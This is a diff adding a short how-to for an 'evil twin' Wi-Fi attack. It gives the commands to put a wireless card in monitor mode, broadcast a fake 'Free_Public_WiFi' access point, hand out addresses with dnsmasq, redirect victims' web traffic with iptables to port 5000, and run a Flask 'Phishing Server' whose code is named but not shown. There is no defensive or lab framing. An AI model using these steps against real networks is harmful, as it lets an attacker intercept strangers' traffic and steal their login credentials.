@@ -1,0 +1,49 @@
+1️⃣ Prepare Wi-Fi Adapter
+
+#Put the wireless card in monitor mode:
+
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+#Verify interface (e.g., wlan0mon):
+
+iwconfig
+
+2️⃣ Create Fake Access Point
+
+#Broadcast a spoofed SSID:
+
+sudo airbase-ng -e "Free_Public_WiFi" -c 6 wlan0mon  (This creates a new interface (at0).)
+
+3️⃣ Assign IP Address
+
+sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
+
+4️⃣ Configure dnsmasq
+
+#Edit /etc/dnsmasq.conf:
+
+interface=at0
+dhcp-range=10.0.0.10,10.0.0.50,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+
+#Start dnsmasq:
+
+sudo dnsmasq -C /etc/dnsmasq.conf -d
+
+5️⃣ Setup iptables for Redirection
+
+sudo iptables --flush
+sudo iptables -t nat --flush
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:5000
+sudo iptables -t nat -A POSTROUTING -j MASQUERADE
+
+6️⃣ Flask Phishing Server
+
+#create app.py
+#templates/login.html
+
+**once setup**
+python3 app.py (in terminal)
+
